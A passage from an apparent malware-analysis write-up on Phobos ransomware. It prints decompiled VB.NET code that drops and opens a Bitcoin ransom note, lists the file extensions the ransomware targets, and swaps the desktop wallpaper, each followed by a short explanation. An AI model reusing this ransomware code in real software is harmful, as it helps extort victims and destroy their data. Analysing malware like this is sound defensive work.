	Dim text As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\" + Program.droppedMessageTextbox
	Try
		File.WriteAllLines(text, Program.messages)
		Thread.Sleep(500)
		Process.Start(text)
	Catch
	End Try
End Sub
```

This code creates a "read_it.txt" file with a ransom message and then opens it. The message states that the user's files are encrypted and demands a Bitcoin payment to decrypt them.

### validExtensions

```
Private Shared validExtensions As String() = New String() {
    ".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls",
    ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy",
    ".png", ".csv", ".py", ".sql", ".mdb", ".php", ".asp", ".aspx", ".html",
    ".htm", ".xml", ".psd", ".pdf", ".xla", ".cub", ".dae", ".indd",
    ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov", ".rtf", ".bmp",
    ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx", ".iso",
    ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
    ".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db",
    ".wmv", ".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif",
    ".vss", ".raw", ".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet",
    ".css", ".js", ".rb", ".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java",
    ".jpe", ".ini", ".blob", ".wps", ".docm", ".wav", ".3gp", ".webm", ".m4v",
    ".amv", ".m4p", ".svg", ".ods", ".bk", ".vdi", ".vmdk", ".onepkg", ".accde",
    ".jsp", ".json", ".gif", ".log", ".gz", ".config", ".vb", ".m1v", ".sln",
    ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf", ".tbi", ".wpd",
    ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw", ".xps",
    ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
    ".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp",
    ".ai", ".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx",
    ".asm", ".asmx", ".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict",
    ".rgbe", ".dwt", ".f4v", ".exr", ".kwm", ".max", ".mda", ".mde", ".mdf",
    ".mdw", ".mht", ".mpv", ".msg", ".myi", ".nef", ".odc", ".geo", ".swift",
    ".odm", ".odp", ".oft", ".orf", ".pfx", ".p12", ".pl", ".pls", ".safe",
    ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm", ".svgz", ".slk", ".tar.gz",
    ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob", ".epsp", ".dc3",
    ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d"
}
```

List of file extensions that will be affected by the ransomware

### SetWallpaper

```
Public Shared Sub SetWallpaper(base64 As String)
	If base64 <> "" Then
		Try
			Dim text As String = Path.GetTempPath() + Program.RandomString(9) + ".jpg"
			File.WriteAllBytes(text, Convert.FromBase64String(base64))
			Program.SystemParametersInfo(20UI, 0UI, text, 3UI)
		Catch
		End Try
	End If
End Sub
```
This function changes the computer's wallpaper. It takes a base64-encoded image, converts it into a JPEG file, and sets it as the new wallpaper.

![wallpaper](/images/phobos/phobos-08.png)

### Conclusion

Phobos Ransomware is an advanced malware that encrypts user files, demanding a Bitcoin ransom for recovery. It employs a range of techniques for spreading, encryption, and system manipulation, targeting a wide variety of file types and taking measures to ensure its persistence and evasion.
